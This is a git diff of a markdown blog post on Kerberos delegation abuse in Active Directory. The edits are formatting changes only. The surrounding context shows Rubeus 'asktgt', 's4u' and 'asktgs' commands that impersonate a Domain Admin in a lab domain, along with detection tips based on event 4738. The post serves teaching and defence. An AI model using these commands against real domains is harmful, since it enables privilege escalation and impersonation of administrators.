@@ -164,7 +164,7 @@ c:\work\dev\Rubeus\Rubeus\bin\Debug>Rubeus.exe asktgt /user:SA-TEST-01 /domain:C
 
 Then we will perform a `s4u` attack by asking to impersonate a privileged account (here alice is *Domain Admin*).
 
-```
+```text
 c:\work\dev\Rubeus\Rubeus\bin\Debug>Rubeus.exe s4u /msdsspn:krbtgt/COSMOS /domain:COSMOS /dc=127.0.0.1 /impersonateuser:alice /ticket:sa_tgt /outfile:alice
 
    ______        _
@@ -255,7 +255,7 @@ Here `Rubeus` ask for `S4uSelf` ticket for himself (SA-TEST-01) and then ask a T
 
 Finally, we can ask a TGS for a sensible service using the ticket get from `s4u` that impersonate a high privilege user, and can act as a TGT!
 
-```
+```text
 c:\work\dev\Rubeus\Rubeus\bin\Debug>Rubeus.exe asktgs /ticket:alice_krbtgt_COSMOS /domain:COSMOS /dc:127.0.0.1 /service:cifs/WIN-P8AJE4ISDL7
 
    ______        _
@@ -325,7 +325,7 @@ We can say +1 !
 
 To detect it, we can rely on event id `4738`, **A user account was changed**, and monitoring the attribute value of ` AllowedToDelegateTo=*krbtgt*`:
 
-**![](27e822f7e14e40a6ef8e4dc223698a16b942df1ba88d5c4306ea48920f36c383)**
+**![](/images/27e822f7e14e40a6ef8e4dc223698a16b942df1ba88d5c4306ea48920f36c383.png)**
 
 Or by using ldap with the following filter:
 
@@ -345,7 +345,7 @@ Thanks Clement Notin (@cnotin) for his help :pray:
 
 # Links
 
-https://en.hackndo.com/kerberos-silver-golden-tickets/
-http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/
-https://github.com/Kevin-Robertson/Powermad
-https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-ever-heard-of/
+- https://en.hackndo.com/kerberos-silver-golden-tickets/
+- http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/
+- https://github.com/Kevin-Robertson/Powermad
+- https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-ever-heard-of/
